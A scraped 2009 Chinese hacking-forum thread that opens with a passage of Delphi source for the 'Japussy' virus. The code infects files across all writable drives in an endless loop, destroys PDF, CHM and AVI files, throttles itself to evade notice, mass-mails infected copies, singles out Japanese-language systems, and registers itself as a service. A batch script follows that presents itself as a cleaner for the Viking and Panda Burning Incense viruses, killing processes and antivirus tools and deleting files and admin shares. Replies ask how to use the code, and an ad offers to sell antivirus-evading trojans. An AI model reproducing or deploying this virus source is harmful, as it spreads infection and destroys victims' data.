            (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.PDF&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) or (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.CHM&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) or (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.AVI&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) then
              SmashFile(Fn); //摧毁文件
          end;
        end;
        end;
        //感染或删除一个文件后睡眠200毫秒，避免CPU占用率过高引起怀疑
        Sleep(200);
      until (FindNext(SearchRec) &lt;&gt; 0);
end;
FindClose(SearchRec);
SubDir := TStringList.Create;
if (FindFirst(Path + &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;/<em>./</em>&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, faDirectory, SearchRec) = 0) then
begin
      repeat
        if IsValidDir(SearchRec) = 1 then
        SubDir.Add(SearchRec.Name);
      until (FindNext(SearchRec) &lt;&gt; 0);
      end;
FindClose(SearchRec);
Count := SubDir.Count - 1;
for i := 0 to Count do
      LoopFiles(Path + SubDir.Strings + &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;\&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, Mask);
FreeAndNil(SubDir);
end;
{ 遍历磁盘上所有的文件 }
procedure InfectFiles;
var
DriverList: string;
i, Len: Integer;
begin
if GetACP = 932 then //日文操作系统
      IsJap := True; //去死吧！
DriverList := GetDrives; //得到可写的磁盘列表
Len := Length(DriverList);
while True do //死循环
begin
      for i := Len downto 1 do //遍历每个磁盘驱动器
        LoopFiles(DriverList + &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;:\&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;/<em>./</em>&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;); //感染之
      SendMail; //发带毒邮件
      Sleep(1000 /<em> 60 /</em> 5); //睡眠5分钟
end;
end;
{ 主程序开始 }
begin
if IsWin9x then //是Win9x
      RegisterServiceProcess(GetCurrentProcessID, 1) //注册为服务进程
else //WinNT
begin
      //远程线程映射到Explorer进程
      //哪位兄台愿意完成之？
end;
//如果是原始病毒体自己
if CompareText(ExtractFileName(ParamStr(0)), &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;Japussy.exe&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) = 0 then
      InfectFiles //感染和发邮件
else //已寄生于宿主程序上了，开始工作
begin
      TmpFile := ParamStr(0); //创建临时文件
      Delete(TmpFile, Length(TmpFile) - 4, 4);
      TmpFile := TmpFile + /#32 + &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.exe&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;; //真正的宿主文件，多一个空格
      ExtractFile(TmpFile); //分离之
      FillStartupInfo(Si, SW_SHOWDEFAULT);
      CreateProcess(PChar(TmpFile), PChar(TmpFile), nil, nil, True,
        0, nil, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, Si, Pi); //创建新进程运行之
      InfectFiles; //感染和发邮件
end;
end.
请转帖的朋友标明出处    <a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL3d3dy5ob25rZXJjbi5uZXQ=" target="_blank"><a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL3d3dy5ob25rZXJjbi5uZXQ=">http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL3d3dy5ob25rZXJjbi5uZXQ=</a></a>
以下为清除威金、熊猫烧香病毒的批处理
@echo off
title 清除威金（logo_1,熊猫烧香）病毒最新变种工具
@echo 清除VIKING病毒最新变种工具
pause
if exist %windir%\rundl132.exe echo ---报告老大，发现有威金病毒埋伏! 让我来干掉它-----
if exist %windir%\logo_1.exe echo ---报告老大，发现有威金病毒埋伏!让我来干掉它 -----
//杀viking进程
tskill logo_1
tskill rundl132
tskill zt
tskill wow
tskill logo1</em>
tskill Ravmon
tskill Eghost
tskill Mailmon
tskill KAVPFW
tskill IPARMOR
tskill Ravmond
taskkill /f /im 0sy.exe
taskkill /f /im 1sy.exe
taskkill /f /im 2sy.exe
taskkill /f /im 3sy.exe
taskkill /f /im 4sy.exe
taskkill /f /im 5sy.exe
taskkill /f /im 6sy.exe
taskkill /f /im 7sy.exe
taskkill /f /im 8sy.exe
taskkill /f /im 9sy.exe
//删除木马
del d:_desktop.ini /f/s/q/a
del c:\Program Files_desktop.ini
del %Windir%\MickNew\MickNew.dll
del %Windir%\MH<em>FILE\MH_DLL.dll
del %Windir%_desktop.ini
del %Windir%\TODAYZTKING\TODAYZTKING.DLL
attrib -h -r -s c:\go.exe
del c:\go.exe
del c:\setup.exe
attrib -h -s -r c:\autorun.inf
del c:\autorun.inf
attrib -h -r -s d:\go.exe
del d:\go.exe
del d:\setup.exe
attrib -h -s -r d:\autorun.inf
del d:\autorun.inf
del e:\setup.exe
attrib -h -r -s e:\go.exe
del e:\go.exe
attrib -h -s -r e:\autorun.inf
del e:\autorun.inf
attrib -h -r -s f:\go.exe
del f:\go.exe
del f:\setup.exe
attrib -h -s -r f:\autorun.inf
del f:\autorun.inf
attrib -h -r -s g:\go.exe
del g:\go.exe
del g:\setup.exe
attrib -h -s -r g:\autorun.inf
del g:\autorun.inf
del h:\go.exe
del h:\setup.exe
attrib -h -s -r g:\autorun.inf
del h:\autorun.inf
del i:\go.exe
attrib -h -s -r g:\autorun.inf
del i:\autorun.inf
del i:\setup.exe
del j:\go.exe
attrib -h -s -r g:\autorun.inf
del j:\autorun.inf
del j:\setup.exe
del %windir%\system\Logo1</em>.exedel %windir%\system\Logo<em>1.exe
del %windir%\rundl132.exe
del %windir%\vDll.dll
del %windir%\Dll.dll
del %windir%\0Sy.exe
del %windir%\1Sy.exe
del %windir%\2Sy.exe
del %windir%\3Sy.exe
del %windir%\5Sy.exe
del %windir%\1.com
@echo ^</em>^ 报告老大，VIKING已经全都被处死
@echo 真累哈,再给你的系统免疫下,不需要的话请直接退出
pause
//免疫系统
echo &gt; %windir%\Logo1<em>.exe
echo &gt; %windir%\rundl132.exe
echo &gt; %windir%\0Sy.exe
echo &gt; %windir%\vDll.dll
echo &gt; %windir%\1Sy.exe
echo &gt; %windir%\2Sy.exe
echo &gt; %windir%\rundll32.exe
echo &gt; %windir%\3Sy.exe
echo &gt; %windir%\5Sy.exe
echo &gt; %windir%\1.com
echo &gt; %windir%\exerouter.exe
echo &gt; %windir%\EXP10RER.com
echo &gt; %windir%\finders.com
echo &gt; %windir%\Shell.sys
echo &gt; %windir%\kill.exe
echo &gt; %windir%\sws.dll
echo &gt; %windir%\sws32.dll
echo &gt; %windir%\uninstall\rundl132.exe
echo &gt; %windir%\SVCHOST.exe
echo &gt; %windir%\WINLOGON.exe
echo &gt; %windir%\RUNDLL32.EXE
echo &gt; C:\&quot;Program Files&quot;\svchost.exe
echo &gt; C:\&quot;Program Files&quot;\&quot;Internet Explorer&quot;\svchost.exe
echo &gt; %windir%\Download\svchost.exe
echo &gt; %windir%\system32\wldll.dll
attrib %windir%\Logo1</em>.exe +s +r +h
attrib %windir%\rundl132.exe +s +r +h
attrib %windir%\0Sy.exe +s +r +h
attrib %windir%\vDll.dll +s +r +h
attrib %windir%\1Sy.exe +s +r +h
attrib %windir%\2Sy.exe +s +r +h
attrib %windir%\rundll32.exe +s +r +h
attrib %windir%\3Sy.exe +s +r +h
attrib %windir%\5Sy.exe +s +r +h
attrib %windir%\1.com +s +r +h
attrib %windir%\exerouter.exe +s +r +h
attrib %windir%\EXP10RER.com +s +r +h
attrib %windir%\finders.com +s +r +h
attrib %windir%\Shell.sys +s +r +h
attrib %windir%\kill.exe +s +r +h
attrib %windir%\sws.dll +s +r +h
attrib %windir%\sws32.dll +s +r +h
attrib %windir%\uninstall\rundl132.exe +s +r +h
attrib %windir%\SVCHOST.exe +s +r +h
attrib %windir%\WINLOGON.exe +s +r +h
attrib %windir%\RUNDLL32.EXE +s +r +h
attrib C:\&quot;Program Files&quot;\svchost.exe +s +r +h
attrib C:\&quot;Program Files&quot;\&quot;Internet Explorer&quot;\svchost.exe +s +r +h
attrib %windir%\Download\svchost.exe +s +r +h
attrib %windir%\system32\wldll.dll +s +r +h
net share c$ /del
net share d$ /del
net share e$ /del
net share f$ /del
net share admin$ /del
net share ipc$ /del
cls
@echo -------------------------------------
@echo viking已经全部被我杀完拉,哈,厉害吧
@echo 盗攻网络提醒您：系统已经成功免疫!
@echo 谢谢你的使用,请重启您的电脑!
@echo -------------------------------------
pause
<a href="http://bbs.hackerxfiles.net/logging.php?action=login" target="_blank">收藏</a> <a href="http://bbs.hackerxfiles.net/misc.php?action=emailfriend&amp;tid=375697" target="_blank">分享</a> <a href="http://bbs.hackerxfiles.net/logging.php?action=login" target="_blank">评分</a>
<a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL3NiYXBzcGwuMzMyMi5vcmcvb2trLmh0bWw=" target="_blank">承接免杀木马业务_出售各类免杀木马</a> <em><a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=13&amp;tid=375697&amp;reppost=1349997&amp;extra=page%3D1&amp;page=1" target="_blank">回复</a> <a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=13&amp;tid=375697&amp;repquote=1349997&amp;extra=page%3D1&amp;page=1" target="_blank">引用</a></em></p>
<p><a href="http://bbs.hackerxfiles.net/my.php?item=subscriptions&amp;subadd=375697" target="_blank">订阅</a> <a href="">TOP</a></p>
<p><a href="http://bbs.hackerxfiles.net/space.php?uid=270056" target="_blank">stws</a></p>
<ul>
<li><a href="http://bbs.hackerxfiles.net/pm.php?action=new&amp;uid=270056" title="发短消息" target="_blank">发短消息</a></li>
<li><a href="http://bbs.hackerxfiles.net/my.php?item=buddylist&amp;newbuddyid=270056&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.hackerxfiles.net/space-uid-270056.html" target="_blank">stws</a> <em>当前离线</em>
<a href="http://wpa.qq.com/msgrd?V=1&amp;Uin=448736941&amp;Site=黑客X档案官方论坛&amp;Menu=yes" title="QQ" target="_blank"><img src="" alt="QQ"></a><a href="http://bbs.hackerxfiles.net/space-uid-270056.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href="http://bbs.hackerxfiles.net/space-uid-270056.html" target="_blank"><img src="" alt=""></a></p>
<p><em>学前班</em></p>
<p>帖子85 积分43 威望0 个 金币179 个 宣传0 个 注册时间2009-6-6 最后登录2009-10-17  <strong><a href="&quot;复制本帖链接&quot;"><em>2</em>楼</a></strong></p>
<p><img src="" alt=""> <em>发表于 2009-8-7 12:05</em> | <a href="http://bbs.hackerxfiles.net/viewthread.php?tid=375697&amp;page=1&amp;authorid=270056" target="_blank">只看该作者</a></p>
<p>哇哇    强
  呼呼
℡. 「結綀過祛;”ì從薪開始」!． <em><a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=13&amp;tid=375697&amp;reppost=1350004&amp;extra=page%3D1&amp;page=1" target="_blank">回复</a> <a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=13&amp;tid=375697&amp;repquote=1350004&amp;extra=page%3D1&amp;page=1" target="_blank">引用</a></em></p>
<p><a href="">TOP</a>
<a href="http://bbs.hackerxfiles.net/space.php?uid=284406" target="_blank">NEWFHCOME</a></p>
<ul>
<li><a href="http://bbs.hackerxfiles.net/pm.php?action=new&amp;uid=284406" title="发短消息" target="_blank">发短消息</a></li>
<li><a href="http://bbs.hackerxfiles.net/my.php?item=buddylist&amp;newbuddyid=284406&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.hackerxfiles.net/space-uid-284406.html" target="_blank">NEWFHCOME</a> <em>当前离线</em>
<a href="http://bbs.hackerxfiles.net/space-uid-284406.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href="http://bbs.hackerxfiles.net/space-uid-284406.html" target="_blank"><img src="" alt=""></a></p>
<p><em>学前班</em></p>
<p>帖子5 积分3 威望0 个 金币17 个 宣传0 个 注册时间2009-8-5 最后登录2009-8-9  <strong><a href="&quot;复制本帖链接&quot;"><em>3</em>楼</a></strong></p>
<p><img src="" alt=""> <em>发表于 2009-8-7 13:44</em> | <a href="http://bbs.hackerxfiles.net/viewthread.php?tid=375697&amp;page=1&amp;authorid=284406" target="_blank">只看该作者</a></p>
<p>厉害啊。 <em><a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=13&amp;tid=375697&amp;reppost=1350096&amp;extra=page%3D1&amp;page=1" target="_blank">回复</a> <a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=13&amp;tid=375697&amp;repquote=1350096&amp;extra=page%3D1&amp;page=1" target="_blank">引用</a></em></p>
<p><a href="">TOP</a></p>
<p><a href="http://bbs.hackerxfiles.net/space.php?uid=283175" target="_blank">Jsonin</a></p>
<ul>
<li><a href="http://bbs.hackerxfiles.net/pm.php?action=new&amp;uid=283175" title="发短消息" target="_blank">发短消息</a></li>
<li><a href="http://bbs.hackerxfiles.net/my.php?item=buddylist&amp;newbuddyid=283175&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.hackerxfiles.net/space-uid-283175.html" target="_blank">Jsonin</a> <em>当前离线</em>
<a href="http://wpa.qq.com/msgrd?V=1&amp;Uin=137744086&amp;Site=黑客X档案官方论坛&amp;Menu=yes" title="QQ" target="_blank"><img src="" alt="QQ"></a><a href="http://bbs.hackerxfiles.net/space-uid-283175.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href="http://bbs.hackerxfiles.net/space-uid-283175.html" target="_blank"><img src="" alt=""></a></p>
<p><em>一年级</em></p>
<p><img src="" alt="Rank: 1"></p>
<p>帖子172 积分86 威望0 个 金币343 个 宣传0 个 注册时间2009-8-1 最后登录2009-10-18  <strong><a href="&quot;复制本帖链接&quot;"><em>4</em>楼</a></strong></p>
<p><img src="" alt=""> <em>发表于 2009-8-8 11:49</em> | <a href="http://bbs.hackerxfiles.net/viewthread.php?tid=375697&amp;page=1&amp;authorid=283175" target="_blank">只看该作者</a></p>
<p>复制这些有什么用？ <em><a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=13&amp;tid=375697&amp;reppost=1351291&amp;extra=page%3D1&amp;page=1" target="_blank">回复</a> <a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=13&amp;tid=375697&amp;repquote=1351291&amp;extra=page%3D1&amp;page=1" target="_blank">引用</a></em></p>
<p><a href="">TOP</a>
<a href="http://bbs.hackerxfiles.net/space.php?uid=285150" target="_blank">qq8318763</a></p>
<ul>
<li><a href="http://bbs.hackerxfiles.net/pm.php?action=new&amp;uid=285150" title="发短消息" target="_blank">发短消息</a></li>
<li><a href="http://bbs.hackerxfiles.net/my.php?item=buddylist&amp;newbuddyid=285150&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.hackerxfiles.net/space-uid-285150.html" target="_blank">qq8318763</a> <em>当前离线</em>
<a href="http://wpa.qq.com/msgrd?V=1&amp;Uin=240188155&amp;Site=黑客X档案官方论坛&amp;Menu=yes" title="QQ" target="_blank"><img src="" alt="QQ"></a><a href="http://edit.yahoo.com/config/send_webmesg?.target=没有&amp;.src=pg" title="Yahoo" target="_blank"><img src="" alt="Yahoo!"></a><a href="&quot;taobao&quot;"><img src="" alt="阿里旺旺"></a><a href="http://user.qzone.qq.com/240188155" title="查看个人网站" target="_blank"><img src="" alt="查看个人网站"></a><a href="http://bbs.hackerxfiles.net/space-uid-285150.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href="http://bbs.hackerxfiles.net/space-uid-285150.html" target="_blank"><img src="" alt=""></a></p>
<p><em>一年级</em></p>
<p><img src="" alt="Rank: 1"></p>
<p>帖子127 积分64 威望0 个 金币203 个 宣传0 个 注册时间2009-8-7 最后登录2009-10-1  <strong><a href="&quot;复制本帖链接&quot;"><em>5</em>楼</a></strong></p>
<p><img src="" alt=""> <em>发表于 2009-8-9 16:21</em> | <a href="http://bbs.hackerxfiles.net/viewthread.php?tid=375697&amp;page=1&amp;authorid=285150" target="_blank">只看该作者</a></p>
<p>可怕啊，好可怕 <em><a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=13&amp;tid=375697&amp;reppost=1353040&amp;extra=page%3D1&amp;page=1" target="_blank">回复</a> <a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=13&amp;tid=375697&amp;repquote=1353040&amp;extra=page%3D1&amp;page=1" target="_blank">引用</a></em></p>
<p><a href="">TOP</a></p>
<p><a href="http://bbs.hackerxfiles.net/space.php?uid=133201" target="_blank">追求梦想</a></p>
<ul>
<li><a href="http://bbs.hackerxfiles.net/pm.php?action=new&amp;uid=133201" title="发短消息" target="_blank">发短消息</a></li>
<li><a href="http://bbs.hackerxfiles.net/my.php?item=buddylist&amp;newbuddyid=133201&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.hackerxfiles.net/space-uid-133201.html" target="_blank">追求梦想</a> <em>当前离线</em>
<a href="http://bbs.hackerxfiles.net/space-uid-133201.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href="http://bbs.hackerxfiles.net/space-uid-133201.html" target="_blank"><img src="" alt=""></a></p>
<p><em>学前班</em></p>
<p>帖子60 积分30 威望0 个 金币52 个 宣传0 个 注册时间2007-10-10 最后登录2009-10-1  <strong><a href="&quot;复制本帖链接&quot;"><em>6</em>楼</a></strong></p>
<p><img src="" alt=""> <em>发表于 2009-8-9 18:01</em> | <a href="http://bbs.hackerxfiles.net/viewthread.php?tid=375697&amp;page=1&amp;authorid=133201" target="_blank">只看该作者</a></p>
<p>r弱弱的问一下，这是什么语言写的？ <em><a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=13&amp;tid=375697&amp;reppost=1353146&amp;extra=page%3D1&amp;page=1" target="_blank">回复</a> <a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=13&amp;tid=375697&amp;repquote=1353146&amp;extra=page%3D1&amp;page=1" target="_blank">引用</a></em></p>
<p><a href="">TOP</a>
<a href="http://bbs.hackerxfiles.net/space.php?uid=272447" target="_blank">YamosY</a></p>
<ul>
<li><a href="http://bbs.hackerxfiles.net/pm.php?action=new&amp;uid=272447" title="发短消息" target="_blank">发短消息</a></li>
<li><a href="http://bbs.hackerxfiles.net/my.php?item=buddylist&amp;newbuddyid=272447&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.hackerxfiles.net/space-uid-272447.html" target="_blank">YamosY</a> <em>当前离线</em>
<a href="http://wpa.qq.com/msgrd?V=1&amp;Uin=598618521&amp;Site=黑客X档案官方论坛&amp;Menu=yes" title="QQ" target="_blank"><img src="" alt="QQ"></a><a href="http://bbs.hackerxfiles.net/space-uid-272447.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href="http://bbs.hackerxfiles.net/space-uid-272447.html" target="_blank"><img src="" alt=""></a></p>
<p><em>学前班</em></p>
<p>帖子86 积分43 威望0 个 金币88 个 宣传0 个 注册时间2009-6-18 最后登录2009-9-13  <strong><a href="&quot;复制本帖链接&quot;"><em>7</em>楼</a></strong></p>
<p><img src="" alt=""> <em>发表于 2009-8-10 05:04</em> | <a href="http://bbs.hackerxfiles.net/viewthread.php?tid=375697&amp;page=1&amp;authorid=272447" target="_blank">只看该作者</a></p>
<p>哇塞~好好专研下~嘿嘿~~<img src="" alt=""> <em><a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=13&amp;tid=375697&amp;reppost=1353566&amp;extra=page%3D1&amp;page=1" target="_blank">回复</a> <a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=13&amp;tid=375697&amp;repquote=1353566&amp;extra=page%3D1&amp;page=1" target="_blank">引用</a></em></p>
<p><a href="">TOP</a></p>
<p><a href="http://bbs.hackerxfiles.net/space.php?uid=277953" target="_blank">ak47chongfeng</a></p>
<ul>
<li><a href="http://bbs.hackerxfiles.net/pm.php?action=new&amp;uid=277953" title="发短消息" target="_blank">发短消息</a></li>
<li><a href="http://bbs.hackerxfiles.net/my.php?item=buddylist&amp;newbuddyid=277953&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.hackerxfiles.net/space-uid-277953.html" target="_blank">ak47chongfeng</a> <em>当前离线</em>
<a href="http://bbs.hackerxfiles.net/space-uid-277953.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href="http://bbs.hackerxfiles.net/space-uid-277953.html" target="_blank"><img src="" alt=""></a></p>
<p><em>学前班</em></p>
<p>帖子32 积分16 威望0 个 金币9 个 宣传0 个 注册时间2009-7-12 最后登录2009-10-27  <strong><a href="&quot;复制本帖链接&quot;"><em>8</em>楼</a></strong></p>
<p><img src="" alt=""> <em>发表于 2009-8-10 12:16</em> | <a href="http://bbs.hackerxfiles.net/viewthread.php?tid=375697&amp;page=1&amp;authorid=277953" target="_blank">只看该作者</a></p>
<p>这是用什么写的 <em><a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=13&amp;tid=375697&amp;reppost=1353877&amp;extra=page%3D1&amp;page=1" target="_blank">回复</a> <a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=13&amp;tid=375697&amp;repquote=1353877&amp;extra=page%3D1&amp;page=1" target="_blank">引用</a></em></p>
<p><a href="">TOP</a>
<a href="http://bbs.hackerxfiles.net/space.php?uid=284737" target="_blank">huangmeng</a></p>
<ul>
<li><a href="http://bbs.hackerxfiles.net/pm.php?action=new&amp;uid=284737" title="发短消息" target="_blank">发短消息</a></li>
<li><a href="http://bbs.hackerxfiles.net/my.php?item=buddylist&amp;newbuddyid=284737&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.hackerxfiles.net/space-uid-284737.html" target="_blank">huangmeng</a> <em>当前离线</em>
<a href="http://wpa.qq.com/msgrd?V=1&amp;Uin=675349738&amp;Site=黑客X档案官方论坛&amp;Menu=yes" title="QQ" target="_blank"><img src="" alt="QQ"></a><a href="http://xinxuedejia.51.com%20%20%20http//blog.sina.com.cn/disappearanceofthesun" title="查看个人网站" target="_blank"><img src="" alt="查看个人网站"></a><a href="http://bbs.hackerxfiles.net/space-uid-284737.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href="http://bbs.hackerxfiles.net/space-uid-284737.html" target="_blank"><img src="" alt=""></a></p>
<p><em>学前班</em></p>
<p>帖子52 积分26 威望0 个 金币87 个 宣传0 个 注册时间2009-8-6 最后登录2009-10-2  <strong><a href="&quot;复制本帖链接&quot;"><em>9</em>楼</a></strong></p>
<p><img src="" alt=""> <em>发表于 2009-8-10 18:46</em> | <a href="http://bbs.hackerxfiles.net/viewthread.php?tid=375697&amp;page=1&amp;authorid=284737" target="_blank">只看该作者</a></p>
<p>怎么用啊 <em><a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=13&amp;tid=375697&amp;reppost=1354259&amp;extra=page%3D1&amp;page=1" target="_blank">回复</a> <a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=13&amp;tid=375697&amp;repquote=1354259&amp;extra=page%3D1&amp;page=1" target="_blank">引用</a></em></p>
<p><a href="">TOP</a></p>
<p><a href="http://bbs.hackerxfiles.net/space.php?uid=237380" target="_blank">w88446669</a></p>
<ul>
<li><a href="http://bbs.hackerxfiles.net/pm.php?action=new&amp;uid=237380" title="发短消息" target="_blank">发短消息</a></li>
<li><a href="http://bbs.hackerxfiles.net/my.php?item=buddylist&amp;newbuddyid=237380&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.hackerxfiles.net/space-uid-237380.html" target="_blank">w88446669</a> <em>当前离线</em>
<a href="http://bbs.hackerxfiles.net/space-uid-237380.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href="http://bbs.hackerxfiles.net/space-uid-237380.html" target="_blank"><img src="" alt=""></a></p>
<p><em>学前班</em></p>
<p>帖子14 积分7 威望0 个 金币18 个 宣传0 个 注册时间2009-1-31 最后登录2009-8-18  <strong><a href="&quot;复制本帖链接&quot;"><em>10</em>楼</a></strong></p>
<p><img src="" alt=""> <em>发表于 2009-8-18 16:37</em> | <a href="http://bbs.hackerxfiles.net/viewthread.php?tid=375697&amp;page=1&amp;authorid=237380" target="_blank">只看该作者</a></p>
<p>這是用什麼語言寫的 <em><a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=13&amp;tid=375697&amp;reppost=1363577&amp;extra=page%3D1&amp;page=1" target="_blank">回复</a> <a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=13&amp;tid=375697&amp;repquote=1363577&amp;extra=page%3D1&amp;page=1" target="_blank">引用</a></em></p>
<p><a href="">TOP</a></p>
<p><strong>1</strong><a href="http://bbs.hackerxfiles.net/thread-375697-2-1.html" target="_blank">2</a><a href="http://bbs.hackerxfiles.net/thread-375697-3-1.html" target="_blank">3</a><a href="http://bbs.hackerxfiles.net/thread-375697-4-1.html" target="_blank">4</a><a href="http://bbs.hackerxfiles.net/thread-375697-2-1.html" target="_blank">下一页</a><a href="http://bbs.hackerxfiles.net/forum-13-1.html" target="_blank">返回列表</a>
<a href="http://bbs.hackerxfiles.net/?gid=47" target="_blank">论坛特区</a></p>
<ul>
<li><a href="http://bbs.hackerxfiles.net/forum-44-1.html" target="_blank">【新生报到】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-31-1.html" target="_blank">【原创发布】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-25-1.html" target="_blank">【骇客新闻】</a> <a href="http://bbs.hackerxfiles.net/?gid=4" target="_blank">杂志相关</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-19-1.html" target="_blank">【新书发布】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-39-1.html" target="_blank">【杂志事务】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-14-1.html" target="_blank">【稿费样刊】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-20-1.html" target="_blank">【杂志工具】</a> <a href="http://bbs.hackerxfiles.net/?gid=1" target="_blank">技术讨论</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-5-1.html" target="_blank">【小菜举手】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-48-1.html" target="_blank">【攻防技术】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-13-1.html" target="_blank">【编程魔方】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-29-1.html" target="_blank">【毒木成林】</a> <a href="http://bbs.hackerxfiles.net/?gid=28" target="_blank">资料发布</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-49-1.html" target="_blank">【资料审核】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-42-1.html" target="_blank">【QQ 攻防】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-16-1.html" target="_blank">【农具店铺】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-43-1.html" target="_blank">【动画教程】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-50-1.html" target="_blank">【黑客资料】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-21-1.html" target="_blank">【资源共享】</a> <a href="http://bbs.hackerxfiles.net/?gid=3" target="_blank">休闲娱乐</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-6-1.html" target="_blank">【寂寞梧桐】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-26-1.html" target="_blank">【笔墨江湖】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-24-1.html" target="_blank">【影音梧桐】</a> <a href="http://bbs.hackerxfiles.net/?gid=9" target="_blank">论坛站务</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-46-1.html" target="_blank">【官方公告】</a></li>
